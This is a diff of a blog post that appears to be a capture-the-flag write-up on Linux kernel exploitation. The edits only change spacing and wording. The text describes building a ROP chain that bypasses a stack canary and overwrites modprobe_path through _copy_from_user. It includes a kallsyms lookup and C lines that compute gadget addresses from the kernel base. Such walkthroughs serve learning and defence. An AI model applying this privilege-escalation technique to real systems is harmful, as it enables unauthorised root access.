@@ -531,6 +531,7 @@ As we saw from mitigation we have to rop also this time!
 Running ROPgadget on our vmlinux file we got:
 
     Unique gadgets found: 1113512
+
 We also need to redo the state saving as we do in KernelROP... and at the end of our payload we need to restore it.
 I will use again modprobe_path overwrite because is my favorite technique. I will use the same shitty c code I used with last post.
 
@@ -553,6 +554,9 @@ And we got:
     [    2.906202] Knock, and the door will be opened unto you.
     [    5.890603] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: device_write+0x47/0x50 [chall]
     [    5.891607] CPU: 0 PID: 158 Comm: exploit Tainted: G           OE     5.19.0-43-generic #44~22.04.1-Ubuntu
+
+
+
 If we inspect gadgets we are not that lucky as we were on Kernel Rop, where we have a ropchain like this
 
     -cookie
@@ -561,7 +565,9 @@ If we inspect gadgets we are not that lucky as we were on Kernel Rop, where we h
     -pop reg2
     -modprobe address
     -mov qword ptr [reg2], reg1 ; ret
+
 This time we have to use `_copy_from_user`, this function has 3 parameters respectively: 
+
 
  1. RDI = modprobe_path address
  2. RSI = "/tmp/m" string
@@ -572,7 +578,7 @@ So now we need the offset of `_copy_from_user`, easy to get
 
     cat /proc/kallsyms |grep "T _copy_from_user"
 
-And three gadget : pop rdi | pop rsi | pop rdx. So we get something like this:
+And three gadget : pop rdi, pop rsi and pop rdx. So we get something like this:
 
     unsigned long pop_rdi = kbase + 0x1d675;
     unsigned long pop_rsi = kbase + 0x6ff0c;
